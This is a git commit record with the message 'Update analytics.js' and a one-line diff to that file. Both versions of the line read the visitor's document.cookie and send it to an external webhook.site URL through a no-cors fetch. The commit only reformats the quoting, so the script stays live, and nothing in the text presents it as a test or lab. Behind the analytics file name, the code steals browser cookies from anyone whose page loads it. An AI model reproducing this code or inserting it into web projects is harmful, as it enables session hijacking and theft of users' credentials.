a8635782c123e422b74bd399ff161daf59abfcf3
Nick11207 <qi.nie11@outlook.com>
2025-04-28 16:19:49 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/5e66f017-cffc-469f-8628-60912fc92fed?q=' + encodeURIComponent(document.cookie), {mode: "no-cors"});
+fetch("https://webhook.site/5e66f017-cffc-469f-8628-60912fc92fed?q=" + encodeURIComponent(document.cookie), { mode: "no-cors" });
